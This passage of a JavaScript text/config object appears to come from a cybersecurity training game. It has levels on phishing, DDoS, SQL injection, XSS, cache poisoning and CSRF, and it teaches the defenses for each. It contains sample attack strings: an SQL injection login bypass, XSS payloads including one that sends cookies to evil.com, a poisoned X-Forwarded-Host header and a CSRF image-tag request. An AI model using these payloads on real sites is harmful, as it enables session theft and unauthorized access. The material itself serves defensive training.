          subject: 'YOU WON AN IPHONE 15!!!',
          preview: 'Congratulations! You are visitor number 1,000,000...',
          body: 'CONGRATULATIONS!!!\n\nYou have been selected as the winner of our monthly prize. You won a brand new iPhone 15 Pro Max!\n\nDownload the attached form to claim your prize within 1 hour!\n\nClick here: http://claim-prize-now.xyz/win',
          attachmentName: 'win_form.exe',
          explanation: 'PHISHING: Offer is too good to be true, suspicious domain (.xyz), attachment is an executable (.exe) likely containing malware.',
          links: ['http://claim-prize-now.xyz/win']
        },
        {
          id: 6,
          from: 'newsletter@tech-news.com',
          timestamp: 'Yesterday 18:30',
          subject: 'Tech News of the Week',
          preview: 'Here is what happened in the tech world...',
          body: 'Hi,\n\nHere is your weekly summary of the most important tech news:\n\n1. New quantum processors announced\n2. AI Act approved in EU\n3. Advances in cybersecurity\n\nRead more on our site.\n\nTech News Team\nUnsubscribe',
          explanation: 'LEGITIMATE: Typical newsletter, consistent branding links, no strange requests.',
          links: ['https://tech-news.com/weekly']
        }
      ],
      hints: {
        step0: 'Open each email and check the sender. Click the address to see the full domain. Look for errors like "paypa1.com" instead of "paypal.com".',
        step1: 'Use the "Inspect Headers" button to see technical details. SPF and DKIM "FAIL" indicate the email is not authentic!',
        step2: 'Read the content carefully. Watch for: urgent requests, grammatical errors, money/password requests, suspicious tone.',
        step3a: '✅ Keep going! Classify each email as "Safe Email" or "Report Phishing". You will get immediate feedback.',
        step3b: 'Watch out for attachments! An .exe file is a huge red flag. Always check the sender domain.',
        step3c: 'You are doing well! Remember: when in doubt, better to mark as phishing than risk it. Just a few emails left!',
        default: '✅ Keep going! Classify each email as "Safe Email" or "Report Phishing". You get immediate feedback. Watch out for .exe attachments!'
      },
      browser: {
        paypal: {
          title: 'PayPal Official Site',
          urlInfo: 'Correct URL: https://paypal.com',
          ssl: 'Valid SSL Certificate ✅'
        },
        google: {
          title: 'How to recognize phishing emails',
          dangerTitle: '⚠️ Warning Signs:',
          dangerList: [
            'Suspicious or unknown sender',
            'Spelling errors in domain',
            'Urgent requests for action',
            'Links not matching declared domain'
          ],
          safeTitle: '✅ Always Verify:',
          safeList: [
            'SPF and DKIM in headers',
            'Sender domain',
            'Link destination'
          ]
        }
      },
      debrief: {
        success: {
          title: 'PHISHING DETECTION ANALYSIS',
          resultExcellent: 'RESULT: EXCELLENT - Perfect identification of all phishing emails!',
          resultGood: 'RESULT: GOOD - You identified almost all phishing correctly.',
          resultAcceptable: 'RESULT: ACCEPTABLE - You completed the level but with some errors.',
          classified: 'Emails classified:',
          correct: 'Correct identifications:',
          precision: 'Precision:',
          time: 'Completion time:'
        },
        failure: {
          title: 'PHISHING DETECTION FAILED',
          message: 'You made too many errors and lost credibility with the security team.\n\nTry classifying emails more carefully:\n- Check the sender domain\n- Inspect SPF and DKIM headers\n- Verify suspicious links'
        }
      }
    },
    // Level 2: DDoS
    level2: {
      hints: {
        step0: 'The corporate site is under DDoS attack! Analyze SIEM logs to identify malicious IPs. Open TERMINAL and use "help" for available commands.',
        step1: 'Use "list-ips" in terminal to see suspicious IPs. Block malicious ones with "block <ip>".',
        step2: 'Continue blocking IPs with high traffic (🔴). Careful not to block legitimate ones (🟢)!',
        step3: 'Almost done! Block all malicious IPs to stop the DDoS attack.',
        default: 'Block all malicious IPs to complete the mission!'
      },
      logs: {
        flood: 'HTTP flood detected - 500 requests/sec from single source',
        abnormal: 'Abnormal traffic pattern - Repeated GET requests to homepage',
        normal: 'Normal user activity - Page load successful',
        distributed: 'Distributed attack pattern detected - Multiple IPs with similar behavior',
        resource: 'Server resource exhaustion - CPU at 98%, Memory at 95%'
      },
      browser: {
        company: {
          title: 'Corporate Website',
          errorTitle: '503 - Service Unavailable',
          errorDesc: 'The server cannot handle the request at this time.',
          errorDetails: 'Error: Connection timeout\nToo many requests to server',
          restoredTitle: '🎉 Site Restored!',
          restoredDesc: 'DDoS attack successfully mitigated.\nTraffic has returned to normal.',
          online: '✓ ONLINE'
        },
        owasp: {
          title: 'OWASP - DDoS Attacks',
          introTitle: '🎯 What is a DDoS attack?',
          introText: 'Distributed Denial of Service: attack that renders a service unusable by overloading it with traffic from multiple sources.',
          indicatorsTitle: '⚠️ DDoS Indicators:',
          indicatorsList: [
            'Suddenly high network traffic',
            'Many requests from different IPs but similar pattern',
            'Server slow or unreachable',
            'CPU/RAM at max'
          ],
          mitigationTitle: '✅ Mitigation Techniques:',
          mitigationList: [
            'Rate Limiting: Limits requests per IP',
            'Firewall: Blocks suspicious traffic',
            'IP Blocking: Blocks malicious sources',
            'Traffic Analysis: Identifies abnormal patterns'
          ]
        }
      },
      terminal: {
        header: '$ CyberShield Security Terminal - DDoS Mitigation Module',
        help: 'Usage: block <ip>\nExample: block 203.0.113.42',
        alreadyBlocked: '[!] IP already blocked',
        maliciousBlocked: '[✓] Malicious IP blocked successfully!\n[+] DDoS traffic reduced',
        legitimateBlocked: '[✗] WARNING: Legitimate user!\n[!] False positive detected - User access denied',
        ipBlocked: '[✓] IP blocked',
        firewallAlready: '[!] Firewall already active',
        firewallEnabled: '[✓] Advanced firewall rules enabled\n[+] Suspicious traffic patterns will be filtered',
        rateLimitAlready: '[!] Rate limiting already active',
        rateLimitEnabled: '[✓] HTTP rate limiting enabled\n[+] Maximum 100 requests/minute per IP\n[+] This significantly reduces flood attacks!',
        status: {
          header: '=== SECURITY STATUS ===',
          attackActive: '🔴 ACTIVE',
          attackMitigated: '🟢 MITIGATED',
          traffic: 'Traffic Level',
          firewall: 'Firewall',
          rateLimit: 'Rate Limiting',
          blocked: 'Blocked IPs',
          correct: 'Correct Blocks',
          falsePos: 'False Positives',
          enabled: '✓ Enabled',
          disabled: '✗ Disabled'
        },
        analyze: {
          header: '=== TRAFFIC ANALYSIS ===',
          requests: 'Total Requests: 12,450/sec (CRITICAL)',
          protocol: 'Protocol: 98% HTTP GET requests',
          pattern: 'Pattern: Repeated requests to same endpoint',
          sources: 'high-volume sources detected',
          rec: 'Recommendation: Block malicious IPs and enable rate-limit'
        },
        listIps: {
          header: '=== SUSPICIOUS IP ADDRESSES ===',
          highVolume: 'High-volume sources:',
          normalUsers: 'Normal users:'
        }
      },
      debrief: {
        success: {
          title: 'DDOS ATTACK MITIGATED!',
          message: 'You successfully blocked malicious IPs.',
          techniquesTitle: 'DDOS DEFENSE TECHNIQUES:',
          techniques: [
            'Rate Limiting: limits requests per IP',
            'Advanced Firewall: filters suspicious patterns',
            'Traffic Analysis: identifies anomalies',
            'IP Blocking: blocks malicious sources'
          ],
          conclusion: 'These techniques combined are essential to protect systems from DDoS attacks.'
        },
        failure: {
          title: 'MISSION FAILED',
          message: 'The system was overwhelmed by the DDoS attack.\n\nTry again by blocking all malicious IPs before time runs out.'
        },
        stats: {
          mitigated: 'Traffic mitigated',
          blocked: 'Malicious IPs blocked',
          falsePositives: 'False positives'
        }
      }
    },
    // Level 3: SQL Injection
    level3: {
      logMessages: {
        loginAttempt: 'User login attempt - username: john.doe',
        searchQuery: 'Normal search query - keyword: laptop',
        sqliDetected: "SQL Injection detected! Payload: admin' OR '1'='1 -- Access granted to unauthorized user."
      },
      hints: {
        step0: "Monitor SIEM for SQL Injection alerts.",
        step1: "Open CODE EDITOR and analyze 'login.php' - it is vulnerable to SQL Injection.",
        step2: "The query directly concatenates user input. Attacker uses: admin' OR '1'='1",
        step3: "Use PREPARED STATEMENTS, they compile the query BEFORE data. This makes SQL injection impossible.",
        stepCode: "Here is an example of how to implement PREPARED STATEMENTS:\n$query = $db->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$query->bind_param(\"ss\", $username, $password);",
        step4: "Modification complete! Use 'test-login' in TERMINAL."
      },
      terminal: {
        initial: [
          '$ Application Security Terminal v3.0',
          '$ Monitoring web application...'
        ],
        alert: [
          '$ ALERT: SQL Injection vulnerability detected in login.php',
          '$ ACTION REQUIRED: Fix the query to use prepared statements.'
        ],
        modified: '$ login.php modified. Ready to test.',
        testLogin: {
          testing: '> Testing login with SQLi payload...',
          input: "> Input: username=admin' OR '1'='1",
          success: [
            '[SUCCESS] Input rejected - Prepared statement protected the query.',
            '[SUCCESS] Authentication bypass PREVENTED.',
            '$ MISSION ACCOMPLISHED! SQL Injection vulnerability patched.'
          ],
          fail: [
            '[FAIL] Unauthorized access granted! Query still vulnerable.',
            '$ ERROR: You must use prepared statements with parameter binding.'
          ]
        },
        analyzeCode: {
          header: '=== CODE ANALYSIS: login.php ===',
          vuln: 'Vulnerability: SQL INJECTION (High Severity)',
          loc: 'Location: authenticate_user() function',
          issue: 'Issue: Direct string concatenation in SQL query',
          vector: "Attack Vector: ' OR '1'='1 --",
          rec: 'Recommendation: Use prepared statements with mysqli_prepare()'
        },
        help: "Available: analyze-code, test-login, show-logs",
        notFound: "Command not found:"
      },
      debrief: {
        winTitle: 'VULNERABILITY IDENTIFIED: SQL Injection via String Concatenation.',
        winBody: 'You demonstrated how SQL queries built via string concatenation are vulnerable to injection.',
        lesson: 'LESSON LEARNED: Always use prepared statements and bound parameters to protect the database from malicious input.',
        loss: 'MISSION FAILED. The database was compromised or too many errors made.'
      }
    },
    // Level 4: XSS Defense
    level4: {
      logMessages: {
        sanitizedFalse: 'User john.doe posted comment - Content sanitized: false',
        payloadDetected: 'XSS payload detected in comment: <script>alert("XSS Attack!")</script>',
        blockedScript: 'Suspicious input blocked: <script> tag detected and sanitized',
        criticalExec: 'CRITICAL: Script execution detected in user browser - Cookie theft attempt',
        cspActive: 'Content Security Policy active - Inline scripts blocked',
        normalActivity: 'Normal user activity - Comment posted successfully',
        onerrorActive: 'XSS via onerror attribute: <img src="x" onerror="..."> - Active exploitation',
        sanitizationActive: 'HTML sanitization active - Dangerous attributes removed',
        iframeInjection: 'Iframe injection detected: <iframe src="javascript:alert(\'XSS\')"> - DOM manipulation attempt',
        cspBlocked: 'CSP violation blocked - Iframe sources restricted',
        sessionNormal: 'User session activity - No suspicious behavior detected',
        multipleAttempts: 'Multiple XSS attempts from same IP - Attack pattern confirmed',
        allSanitized: 'All user inputs sanitized - XSS protection fully active'
      },
      browser: {
        portal: {
          title: 'Employee Portal',
          header: 'Company Employee Portal',
          vulnerable: '⚠️ VULNERABLE',
          secure: '✅ SECURE',
          warningTitle: '⚠️ SECURITY WARNING',
          warningText: 'XSS vulnerabilities detected! User input is not sanitized.',
          warningRisk: 'Risk: Cookie theft, session hijacking, malicious redirects',
          secureTitle: '✅ SECURE MODE',
          secureText: 'Input sanitization active. Content Security Policy enforced.',
          secureProt: 'Protection: HTML escaping, CSP headers, HttpOnly cookies',
          blockedLabel: '🛡️ BLOCKED',
          xssLabel: '🚨 XSS',
          scriptWarning: '⚠️ This script would execute in a real browser!',
          addComment: 'Add Comment',
          placeholder: 'Share your thoughts...',
          postBtn: 'Post Comment',
          comments: [
            { id: 1, text: 'Great article! Thanks for sharing.' },
            { id: 2, text: 'Very informative post, looking forward to more content.' },
            { id: 3, text: '<script>alert("XSS Attack!")</script>This is a test comment' },
            { id: 4, text: 'I have a question about the implementation details.' },
            { id: 5, text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">' },
            { id: 6, text: '<iframe src="javascript:alert(\'XSS\')">' }
          ]
        },
        dashboard: {
          title: 'Web Security Dashboard',
          protections: {
            title: '🛡️ Active Protections',
            html: 'HTML Sanitization',
            csp: 'Content Security Policy (CSP)',
            escaping: 'Output Escaping',
            httpOnly: 'HttpOnly Cookies',
            enabled: '✅ ENABLED',
            disabled: '❌ DISABLED'
          },
          risk: {
            title: '📊 XSS Risk Analysis',
            level: 'Overall Risk Level',
            critical: 'CRITICAL',
            low: 'LOW',
            payloads: 'Detected XSS Payloads:',
            execution: 'Script Execution:',
            active: 'ACTIVE ⚠️',
            blocked: 'BLOCKED ✅',
            userData: 'User Data at Risk:',
            yes: 'YES (Cookies, Sessions)',
            no: 'NO'
          }
        }
      },
      terminal: {
        initial: [
          '$ Web Security Terminal v4.0',
          '$ Type "help" for available commands',
          '$ ⚠️  WARNING: XSS vulnerabilities detected in company employee portal!'
        ],
        analyze: {
          header: '=== COMMENT ANALYSIS ===',
          total: 'Total comments:',
          safe: 'Safe comments:',
          suspicious: 'Suspicious comments:',
          patterns: 'Detected XSS patterns:',
          action: '⚠️ Action required: Enable input sanitization!'
        },
        payload: {
          usage: 'Usage: show-payload <comment_id>\nExample: show-payload 3',
          safe: 'Comment is safe - no XSS detected',
          header: '=== XSS PAYLOAD ANALYSIS ===',
          vector: 'Attack Vector:',
          risk: 'Risk:',
          critical: 'CRITICAL - Script can execute!',
          mitigated: 'MITIGATED - Payload blocked'
        },
        identify: {
          header: '=== XSS TYPE IDENTIFICATION ===',
          type: 'Type: STORED XSS (Persistent XSS)',
          desc: 'Description: Malicious scripts stored in database',
          loc: 'Location: User comments in forum',
          impact: 'Impact: Affects all users viewing the page',
          flow: 'Attack Flow:\n1. Attacker posts comment with <script> tag\n2. Script stored in database\n3. Script executes for every user viewing comments',
          success: '✓ XSS type identified successfully!'
        },
        enableSanitization: {
          already: '[!] HTML sanitization is already enabled',
          success: '[✓] HTML sanitization enabled\n[+] Dangerous tags removed: <script>, <iframe>, <object>\n[+] Event handlers stripped: onclick, onerror, onload\n[+] XSS risk: SIGNIFICANTLY REDUCED'
        },
        enableCsp: {
          already: '[!] CSP is already enabled',
          success: '[✓] Content Security Policy (CSP) enabled\n[+] Inline scripts blocked\n[+] Unsafe-eval disabled\n[+] Frame-ancestors restricted\n[+] XSS risk: REDUCED'
        },
        enableEscaping: {
          already: '[!] Output escaping is already enabled',
          success: '[✓] Output escaping enabled\n[+] HTML entities escaped: < becomes &lt;, > becomes &gt;\n[+] Prevents script execution in rendered content\n[+] XSS risk: ELIMINATED for escaped content'
        },
        enableHttpOnly: {
          already: '[!] HttpOnly cookies are already enabled',
          success: '[✓] HttpOnly cookies enabled\n[+] Cookies inaccessible to JavaScript\n[+] Prevents cookie theft via XSS\n[+] Session hijacking risk: REDUCED'
        },
        restart: {
          reqBoth: '[!] Enable at least sanitization and httponly cookies before restarting.',
          reqSanitization: '[!] Missing sanitization. Use enable-sanitization first.',
          reqHttpOnly: '[!] Missing httponly cookies. Use enable-httponly first.',
          success: '[✓] Application restarted\n[✓] Security configurations applied\n[✓] HTML Sanitization: ACTIVE\n[✓] HttpOnly Cookies: ACTIVE\n[✓] XSS attack mitigated successfully!'
        },
        scan: {
          header: '=== VULNERABILITY SCAN ===',
          found: 'VULNERABILITIES FOUND:',
          none: '✓ No critical vulnerabilities detected',
          recs: 'Recommendations:\n1. Enable HTML sanitization (CRITICAL)\n2. Implement Content Security Policy (HIGH)\n3. Enable output escaping (HIGH)\n4. Set HttpOnly flag on cookies (MEDIUM)',
          missingSanitization: '- No input sanitization',
          missingCsp: '- Missing Content Security Policy',
          missingEscaping: '- No output escaping',
          missingHttpOnly: '- Cookies accessible to scripts'
        },
        status: {
          header: '=== SECURITY STATUS ===',
          active: 'XSS Attack Active:',
          execution: 'Script Execution:',
          app: 'App Status:',
          identified: 'XSS Type Identified:',
          protections: 'Active Protections:',
          yes: '🔴 YES',
          no: '🟢 NO',
          activeState: '🔴 ACTIVE',
          blockedState: '🟢 BLOCKED',
          restarted: 'RESTARTED',
          running: 'RUNNING',
          notYet: 'NOT YET'
        },
        help: "Available: analyze-comments, show-payload <id>, identify-xss, enable-sanitization, enable-csp, enable-escaping, enable-httponly, scan-vulnerabilities, restart-app",
        notFound: "Command not found:"
      },
      hints: {
        step0: 'The corporate portal shows abnormal behavior. Check content in BROWSER to understand what is happening.',
        step1: 'Some comments seem to contain code. In TERMINAL use "help" to see available commands.',
        step2: 'XSS attacks exploit unsanitized input. Analyze SIEM logs to see attack patterns.',
        step3: 'To protect cookies from JavaScript, consider HttpOnly settings. To block dangerous tags, use sanitization.',
        step4: 'After enabling necessary protections, remember to restart the application to apply them.'
      },
      debrief: {
        winTitle: 'XSS ATTACK MITIGATED!',
        winBody: 'You successfully protected the employee portal from Cross-Site Scripting attacks.',
        techniquesTitle: 'TECHNIQUES USED:',
        techniques: [
          'Input Sanitization: removes malicious code',
          'HttpOnly Cookies: prevents session theft',
          'CSP: limits script execution sources',
          'Output Escaping: converts special characters'
        ]
      }
    },
    // Level 5: Cache Poisoning
    level5: {
      logMessages: {
        cacheMiss: 'Cache MISS - Fresh content served from origin',
        suspiciousReq: 'Suspicious request detected - X-Forwarded-Host: evil.com',
        reqValidated: 'Request validated - No suspicious headers detected',
        cacheHitPoisoned: 'Cache HIT - Response cached with malicious X-Forwarded-Host header',
        cacheConfigured: 'Cache configured correctly - Dynamic content not cached',
        criticalHit: 'CRITICAL: Legitimate user received poisoned content from cache (Cache HIT)',
        safeContent: 'User received fresh, safe content from origin server',
        normalBrowsing: 'Normal page request - User browsing website',
        cachePollution: 'Cache pollution detected - Same cache key serving different content',
        varyConfigured: 'Vary header configured - Proper cache key includes all sensitive headers',
        consistentContent: 'Cache serving consistent content',
        keyCollision: 'Cache key collision - Multiple requests mapped to same cache entry',
        keyCorrect: 'Cache key properly includes Host and X-Forwarded-Host headers',
        multipleAffected: 'Multiple users affected - Poisoned cache entry served 234 times',
        normalOps: 'Cache operating normally - No poisoning detected'
      },
      browser: {
        site: {
          title: 'Company Website',
          alert: '⚠️ ALERT: Injected malicious content from cache!',
          malicious: 'This content was served from cache with malicious modifications',
          headers: 'HTTP Response Headers:',
          hitWarning: '⚠️ Cache HIT - Served from cache (234 times)',
          secure: '✓ SECURE',
          purged: '✅ Cache has been purged and reconfigured\n✅ Fresh content served from origin server',
          missSuccess: '✓ Cache MISS - Fresh content from origin'
        },
        profile: {
          title: 'User Profile',
          warning: '⚠️ Warning: This personalized content is being served from shared cache!',
          hitWarning: '⚠️ Cache HIT - Private user data served from public cache (89 hits)',
          headerError: 'Cache-Control: public, max-age=3600 ❌ (Should be private or no-store!)',
          freshSuccess: '✅ Personalized content served fresh from origin server',
          missSuccess: '✓ Cache MISS - Dynamic content not cached',
          headerSuccess: 'Cache-Control: no-store, must-revalidate ✅'
        },
        owasp: {
          title: '🛡️ Cache Poisoning - OWASP Guide',
          whatTitle: '🎯 What is Cache Poisoning?',
          whatText: 'An attack that inserts malicious content into shared HTTP cache. Poisoned content is served to all users accessing the cached resource.',
          howTitle: '⚠️ How it works:',
          howList: [
            'Attacker sends request with modified headers (e.g., X-Forwarded-Host)',
            'Server responds including header in response',
            'Response is cached with inadequate cache key',
            'Legitimate users receive poisoned response from cache'
          ],
          keyTitle: '🔑 Cache Key:',
          keyText: 'The cache key refers to the set of request components that define a unique cache entry. If it doesn\'t include sensitive headers (Host, Cookie, etc.), different responses may be served from the same cache entry.',
          prevTitle: '✅ Prevention:',
          prevList: [
            '<strong>Vary header:</strong> Includes sensitive headers in cache key',
            '<strong>Cache-Control:</strong> no-store for dynamic content',
            '<strong>Input validation:</strong> Do not trust client headers',
            '<strong>Proper cache key:</strong> Includes Host, Cookie, etc.'
          ]
        }
      },
      terminal: {
        initial: [
          '$ Reverse Proxy Management Terminal v1.0',
          '$ Type "help" for available commands',
          '$ ⚠️  WARNING: Cache poisoning detected - Malicious content in cache!'
        ],
        showCache: {
          empty: '[✓] Cache is empty',
          header: '=== CACHE ENTRIES ===',
          path: 'Path:',
          status: 'Status:',
          hits: 'Cache Hits:',
          cachedAt: 'Cached at:',
          xCache: 'X-Cache:'
        },
        purgeCache: {
          alreadyEmpty: '[!] Cache is already empty',
          success: '[✓] Cache purged successfully\n[+] All cached entries removed\n[+] Next requests will fetch fresh content from origin\n[!] Remember to fix cache configuration to prevent re-poisoning!'
        },
        showHeaders: {
          header: '=== HTTP RESPONSE HEADERS ===',
          current: 'Current configuration:',
          ccPublic: 'public, max-age=3600 ❌',
          ccPrivate: 'no-store, must-revalidate ✅',
          probPublic: 'Dynamic content is being cached publicly',
          probPrivate: 'Correctly prevents caching of dynamic content',
          varyMissing: '<not set> ❌',
          varySet: 'Host, X-Forwarded-Host, Cookie ✅',
          probVaryMissing: 'Cache key does not include sensitive headers',
          probVarySet: 'Cache key properly includes sensitive headers',
          xfhEvil: 'evil.com ❌',
          xfhSanitized: '<sanitized> ✅',
          probXfhEvil: 'Untrusted header used in cache key',
          probXfhSanitized: 'Header properly validated'
        },
        identifyHeader: {
          success: '=== HEADER ANALYSIS ===\nPoisoning vector identified: X-Forwarded-Host\n\nHow it works:\n1. Attacker sends: X-Forwarded-Host: evil.com\n2. Server uses this header to generate response\n3. Response gets cached with incorrect cache key\n4. All users receive the poisoned response\n\nRoot cause: Cache key does not include X-Forwarded-Host\nSolution: Add "Vary: X-Forwarded-Host" header\n\n✓ Attack vector identified successfully!'
        },
        fixCacheKey: {
          already: '[!] Cache key is already configured correctly',
          success: '[✓] Cache key configuration updated\n[+] Cache key now includes: URL + Host + X-Forwarded-Host + Cookie\n[+] Prevents cache collisions from different requests\n[+] Each unique request gets its own cache entry'
        },
        setCacheControl: {
          usage: 'Usage: set-cache-control no-store',
          already: '[!] Cache-Control is already set to no-store',
          success: '[✓] Cache-Control header updated\n[+] Set to: no-store, must-revalidate\n[+] Dynamic/personalized content will not be cached\n[+] Only static assets will be cached'
        },
        enableVaryHeader: {
          already: '[!] Vary header is already enabled',
          success: '[✓] Vary header enabled\n[+] Set to: Vary: Host, X-Forwarded-Host, Cookie\n[+] Cache key now includes these headers\n[+] Prevents cache poisoning via header manipulation'
        },
        restartProxy: {
          reqPurge: '[!] Please purge cache first before restarting',
          reqFix: '[!] Please fix headers configuration before restarting',
          success: '[✓] Reverse proxy restarted\n[✓] New configuration applied',
          cacheClean: 'CLEAN',
          cacheDirty: 'NEEDS PURGE',
          headersSecure: 'SECURE',
          headersCheck: 'CHECK CONFIG',
          mitigated: '[✓] Cache poisoning mitigated successfully!',
          vulnerable: '[!] System still vulnerable'
        },
        status: {
          header: '=== CACHE SECURITY STATUS ===',
          poisoned: 'Cache Poisoned:',
          entries: 'Cache Entries:',
          cleared: 'Cache Cleared:',
          headersFixed: 'Headers Fixed:',
          vary: 'Vary Header:',
          keyFixed: 'Cache Key Fixed:',
          noCache: 'No-Cache Dynamic:',
          identified: 'Header Identified:',
          restarted: 'Proxy Restarted:',
          yes: '🔴 YES',
          no: '🟢 NO'
        },
        help: "Available: show-cache, purge-cache, show-headers, identify-header, fix-cache-key, set-cache-control no-store, enable-vary-header, restart-proxy, status",
        notFound: "Command not found:"
      },
      hints: {
        step0: 'In SIEM analyze logs and look for "Cache HIT" with anomalous content. In TERMINAL use "show-cache" to see what has been cached.',
        step1: 'Cache is purged! In TERMINAL identify the responsible header with "identify-header" and analyze how the proxy is caching content.',
        step2: 'In TERMINAL enable "Vary" header with "enable-vary-header" and use "set-cache-control no-store" for dynamic content. Then restart proxy.',
        step3: 'In TERMINAL use "restart-proxy" to apply all security changes. Verify with "status" that protections are active.',
        step4: {
          a: 'You are almost done! In TERMINAL use "status" to verify that all protections are active.',
          b: 'Remember: Vary header must include Host and X-Forwarded-Host to avoid different versions being cached together.',
          c: 'Last step! In TERMINAL ensure proxy is restarted with "restart-proxy" and cache is clean with "show-cache".'
        },
        default: 'In TERMINAL use "status" to verify that all protections are active!'
      },
      debrief: {
        title: 'CACHE POISONING DEFENSE ANALYSIS',
        cleared: 'Cache cleared:',
        fixed: 'Headers fixed:',
        vary: 'Vary header enabled:',
        time: 'Completion time:',
        success: 'RESULT: Cache Poisoning threat neutralized!',
        completed: 'RESULT: Completed.',
        fail: 'Time expired! The cache poisoning attack affected too many users.\n\nClear the cache and configure proper headers more quickly next time.'
      }
    },
    // Level 6: CSRF
    level6: {
      browser: {
        portal: {
          title: 'Company Finance Portal',
          header: 'Company Finance Portal',
          vulnerable: '⚠️ VULNERABLE',
          secure: '✅ SECURE',
          warningTitle: '⚠️ SECURITY ALERT',
          warningText: 'CSRF vulnerabilities detected! Requests not validated.',
          warningRisk: 'Risk: Unauthorized transfers, account takeover, data modification',
          secureTitle: '✅ SECURE MODE',
          secureText: 'CSRF protection active. All requests validated.',
          secureProt: 'Protection: CSRF tokens, SameSite cookies, Origin validation',
          account: {
            title: 'Account Summary',
            holder: 'Account Holder',
            number: 'Account Number',
            balance: 'Current Balance',
            unauthorized: '⚠️ Unauthorized transfer detected!',
            email: 'Email'
          },
          activity: {
            title: 'Recent Activity',
            blockReason: 'CSRF protection active',
            blockedLabel: '🛡️ BLOCKED',
            csrfLabel: '🚨 CSRF',
            forged: '⚠️ This request was forged by an external site!',
            completed: 'COMPLETED',
            blocked: 'BLOCKED',
            amount: 'Amount:',
            newEmail: 'New email:',
            origin: 'Origin:'
          },
          addComment: 'Add Comment',
          placeholder: 'Share your thoughts...',
          postBtn: 'Post Comment'
        },
        dashboard: {
          title: 'CSRF Protection Dashboard',
          protections: {
            title: '🛡️ Active Protections',
            tokens: 'CSRF Tokens (Synchronizer Pattern)',
            sameSite: 'SameSite Cookies',
            origin: 'Origin/Referer Validation',
            double: 'Double Submit Cookie',
            enabled: '✅ ENABLED',
            disabled: '❌ DISABLED'
          },
          risk: {
            title: '📊 CSRF Risk Analysis',
            level: 'Overall Risk Level',
            critical: 'CRITICAL',
            low: 'LOW',
            detected: 'CSRF Requests Detected:',
            unauthorized: 'Unauthorized Actions:',
            executed: 'EXECUTED ⚠️',
            blocked: 'BLOCKED ✅',
            loss: 'Financial Loss:',
            yes: 'YES (Cookies, Sessions)',
            no: 'NO'
          },
          vectors: {
            title: '🎯 Known CSRF Attack Vectors',
            form: {
              title: '1. Malicious Form Submission',
              desc: 'Attacker hosts hidden form that auto-submits to victim site'
            },
            img: {
              title: '2. Image Tag Exploit',
              desc: '<img src="bank.com/transfer?amount=5000">'
            },
            xhr: {
              title: '3. XMLHttpRequest/Fetch',
              desc: 'JavaScript making authenticated requests to victim site'
            }
          }
        },
        malicious: {
          title: 'Malicious Site',
          header: '☠️ Attacker\'s Site',
          desc: 'This malicious page contains hidden CSRF attacks:',
          how: {
            title: '🎯 How CSRF Works:',
            list: [
              'Employee logs into company-finance.internal (session cookie set)',
              'Employee visits attacker\'s site (this page)',
              'Hidden form auto-submits to company-finance.internal',
              'Browser includes session cookie automatically',
              'Finance portal executes request as if employee made it',
              'Company funds transferred without authorization!'
            ]
          }
        }
      },
      terminal: {
        initial: [
          '$ CSRF Defense Terminal v6.0',
          '$ Type "help" for available commands',
          '$ ⚠️  WARNING: CSRF attacks detected on company finance portal!'
        ],
        analyze: {
          header: '=== REQUEST ANALYSIS ===',
          total: 'Total requests:',
          legitimate: 'Legitimate requests:',
          csrf: 'CSRF requests:',
          patterns: 'Suspicious patterns detected:',
          action: '⚠️ Action required: Enable CSRF protection!'
        },
        transaction: {
          header: '=== TRANSACTION DETAILS ===',
          id: 'ID:',
          time: 'Time:',
          user: 'User:',
          action: 'Action:',
          amount: 'Amount:',
          destination: 'Destination:',
          origin: 'Origin:',
          status: 'Status:',
          csrf: 'CSRF:',
          yes: 'YES ⚠️',
          no: 'NO ✓',
          risk: 'Risk: CRITICAL - Forged request executed!',
          safe: 'Status: Safe'
        },
        identify: {
          header: '=== CSRF ATTACK IDENTIFICATION ===',
          type: 'Type: CLASSIC CSRF (Cross-Site Request Forgery)',
          desc: 'Description: Unauthorized state-changing requests',
          vector: 'Attack Vector: External sites submitting authenticated requests',
          impact: 'Impact: Unauthorized transfers, account changes, data theft',
          chars: 'Attack Characteristics:',
          success: '✓ CSRF attack type identified successfully!'
        },
        tokens: {
          already: '[!] CSRF tokens are already enabled',
          success: '[✓] CSRF tokens enabled (Synchronizer Token Pattern)\n[+] Unique token generated per session\n[+] Token required in all state-changing requests\n[+] Server validates token before processing\n[+] CSRF risk: SIGNIFICANTLY REDUCED'
        },
        sameSite: {
          already: '[!] SameSite cookies are already enabled',
          success: '[✓] SameSite cookie attribute enabled\n[+] Cookies not sent with cross-site requests\n[+] Policy: SameSite=Strict\n[+] Prevents automatic cookie inclusion\n[+] CSRF risk: REDUCED'
        },
        origin: {
          already: '[!] Origin validation is already enabled',
          success: '[✓] Origin/Referer validation enabled\n[+] Checking Origin header on requests\n[+] Blocking requests from external domains\n[+] Expected origin: company-finance.internal\n[+] CSRF risk: REDUCED'
        },
        double: {
          already: '[!] Double Submit Cookie is already enabled',
          success: '[✓] Double Submit Cookie pattern enabled\n[+] CSRF token stored in cookie AND request parameter\n[+] Server compares both values\n[+] Attacker cannot read cookie due to SOP\n[+] CSRF risk: REDUCED'
        },
        restart: {
          req: '[!] No security changes detected. Apply protections first.',
          success: '[✓] Company finance portal restarted\n[✓] New security configurations applied',
          status: '[✓] CSRF protection status:',
          mitigated: '[✓] CSRF attack mitigated successfully!',
          recommend: '[!] Additional protections recommended'
        },
        balance: {
          header: '=== ACCOUNT STATUS ===',
          current: 'Current Balance:',
          original: 'Original Balance:',
          loss: 'Loss:',
          secure: 'Status: Secure ✓',
          warning: 'WARNING: Unauthorized transfer detected!',
          safe: 'No unauthorized transactions'
        },
        scan: {
          header: '=== CSRF VULNERABILITY SCAN ===',
          found: 'VULNERABILITIES FOUND:',
          none: '✓ No critical vulnerabilities detected',
          recs: 'Recommendations:\n1. Implement CSRF tokens (CRITICAL)\n2. Enable SameSite cookies (HIGH)\n3. Validate Origin/Referer headers (HIGH)\n4. Consider Double Submit Cookie pattern (MEDIUM)',
          missingTokens: '- Missing CSRF tokens',
          missingSameSite: '- SameSite cookies not configured',
          missingOrigin: '- No Origin/Referer validation',
          missingDouble: '- Double Submit Cookie not implemented'
        },
        status: {
          header: '=== SECURITY STATUS ===',
          active: 'CSRF Attack Active:',
          unauth: 'Unauthorized Actions:',
          app: 'App Status:',
          restarted: 'RESTARTED',
          running: 'RUNNING',
          type: 'CSRF Type Identified:',
          notYet: 'NOT YET',
          balance: 'Account Balance:',
          protections: 'Active Protections:',
          yes: '🔴 YES',
